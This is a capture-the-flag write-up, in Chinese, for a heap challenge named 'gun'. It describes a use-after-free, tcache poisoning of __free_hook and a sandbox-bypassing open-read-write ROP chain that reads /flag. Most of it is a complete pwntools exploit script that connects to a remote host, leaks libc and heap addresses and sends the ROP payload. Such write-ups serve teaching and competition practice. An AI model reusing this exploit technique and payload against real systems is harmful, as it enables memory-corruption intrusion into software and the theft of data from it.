# gun
shoot功能存在逻辑问题导致UAF，可以造成load的bullet再次free

利用unsortedbin构造fake chunk，free进tcache后，直接修改fd指向__free_hook即可

程序存在sandbox，只能orw

setcontext为rdx寄存器，考虑转向IO，通过vtable间接设置:
```
https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/
```
或者利用可以通过rdi设置rdx寄存器的gadget：
```
ropper --file ./libc-2.31.so  --search "mov rdx,"
......
0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
......
```

### EXP:
```
from pwn import *

context.log_level="debug"
def add(size,note):
    p.sendlineafter("> ", "3")
    p.sendlineafter("price: ", str(size))
    p.sendafter(": ", note)
def magic(index):
    p.sendlineafter("> ", "2")
    p.sendlineafter("?", str(index))
def delete(index):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(index))

#p=process("./gun")
p=remote("123.57.209.176",30772)
name="name: \n"
p.sendafter(": ",name)
for i in range(8):
   add(0x80,"a\n")
for i in range(8):
    magic(i)
delete(10)

add(0x50,"\n")
magic(0)
delete(1)
p.recvuntil("The ")
libc=u64(p.recv(6)+"\x00\x00")-0x7ffff7fc2be0+0x7ffff7dd7000-0x80
print hex(libc)

for i in range(9):
   add(0x80,"bbbbb\n")

for i in range(9):
    magic(8-i)

delete(10)

add(0x410,p64(0)*16+p64(0)+p64(0x31)+p64(0)*5+p64(0x21)+"\n")
add(0x20,"aaaa\n")
for i in range(6):
   add(0x10,"bbbbb\n")
magic(7)
magic(1)
delete(3)

magic(0)
delete(1)

add(0x20,"\n")
magic(0)
delete(1)
p.recvuntil("The ")
heap=u64(p.recv(6)+"\x00\x00")
print hex(heap)
#0x55555555b330
payload=p64(0)+p64(heap-0x55555555b330+0x55555555b760-0x20)+p64(libc+0x580DD)
rdi=libc+0x0000000000026b72
rsi=libc+0x27529
rdx2=libc+0x162866
rax=libc+0x4a550
payload2=p64(heap-0x55555555b330+0x55555555b810)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(libc+0x111140)
payload2+=p64(rdi)+p64(3)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x00111130)
payload2+=p64(rdi)+p64(1)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x001111d0)
add(0x1b0,payload.ljust(16*8,"\x00")+p64(0)+p64(0x31)+p64(libc+0x00001eeb28)+p64(0)*4+p64(0x21)+"/flag\x00\x00\x00"+p64(0)+payload2+"\n")
add(0x20,p64(heap-0x55555555b330+0x55555555b820)+p64(rdi)+"\n")
add(0x20,p64(libc+0x154930)+"\n")

magic(0)
delete(1)
p.interactive()
```